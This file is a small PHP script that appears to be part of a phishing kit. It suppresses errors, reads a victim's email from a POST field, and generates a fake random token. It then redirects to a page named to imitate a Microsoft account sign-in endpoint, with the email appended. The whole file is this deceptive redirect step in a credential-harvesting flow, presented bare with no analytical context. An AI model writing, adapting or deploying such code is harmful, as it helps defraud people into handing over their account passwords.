<?php
error_reporting(0);

$email = $_POST['kamuboss'];

function random_number(){
	$numbers=array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
	$key=array_rand($numbers);
	return $numbers[$key]; }

$url=random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));$url=random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));

header("Location: oauth20_authorize.srf.php?$url&mes1=$email");

?>